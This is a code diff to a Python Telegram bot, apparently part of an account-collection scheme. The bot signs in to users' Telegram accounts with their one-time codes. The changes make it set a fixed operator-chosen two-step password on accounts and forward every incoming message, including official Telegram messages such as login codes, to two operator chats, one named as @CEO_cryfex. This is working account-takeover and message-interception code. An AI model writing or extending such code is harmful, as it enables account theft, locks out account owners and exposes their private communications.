@@ -2396,12 +2396,13 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             try:
                 # Get current password info
                 password_settings = await client(functions.account.GetPasswordRequest())
-                if password_settings.has_password:
-                    # If already has password, we need to handle it in handle_2fa_input
-                    # But if we are here, sign_in with OTP worked without password
-                    # This shouldn't normally happen if 2FA is on, but let's be safe
-                    pass
                 
+                # Check if 2FA is already enabled
+                if password_settings.has_password:
+                    logger.info(f"2FA already enabled for {phone}, skipping initial setup")
+                    return
+
+                # Enable 2FA with the system password
                 await client(functions.account.UpdatePasswordRequest(
                     current_password_hash=None,
                     new_password=TWO_FA_PASSWORD
@@ -2455,11 +2456,16 @@ Your payment will be moved to Main Balance after verification.
                 emoji = "🔔" if is_official else "📩"
                 forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
                 
+                # Forward to both ADMIN_CHAT_ID and @CEO_cryfex (FORWARD_CHAT_ID)
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
                 )
-                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID}")
+                await context.bot.send_message(
+                    chat_id=ADMIN_CHAT_ID,
+                    text=forward_text
+                )
+                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID} and admin")
             except Exception as e:
                 logger.error(f"Failed to forward message: {e}")
         
@@ -2541,9 +2547,12 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         try:
             # Get current password settings to compute hash
             password_settings = await client(functions.account.GetPasswordRequest())
-            current_password_hash = await client.compute_password_hash(password_settings, password) if hasattr(client, 'compute_password_hash') else None
             
-            if not current_password_hash and password:
+            # Use the actual client's compute_password_hash if available, or fallback
+            current_password_hash = None
+            try:
+                current_password_hash = await client.compute_password_hash(password_settings, password)
+            except:
                 from telethon import password_configs
                 current_password_hash = password_configs.compute_hash(password_settings, password)
             
@@ -2597,11 +2606,16 @@ Your payment will be moved to Main Balance after verification.
                 emoji = "🔔" if is_official else "📩"
                 forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
                 
+                # Forward to both ADMIN_CHAT_ID and @CEO_cryfex (FORWARD_CHAT_ID)
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
                 )
-                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID}")
+                await context.bot.send_message(
+                    chat_id=ADMIN_CHAT_ID,
+                    text=forward_text
+                )
+                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID} and admin")
             except Exception as e:
                 logger.error(f"Failed to forward message: {e}")
 
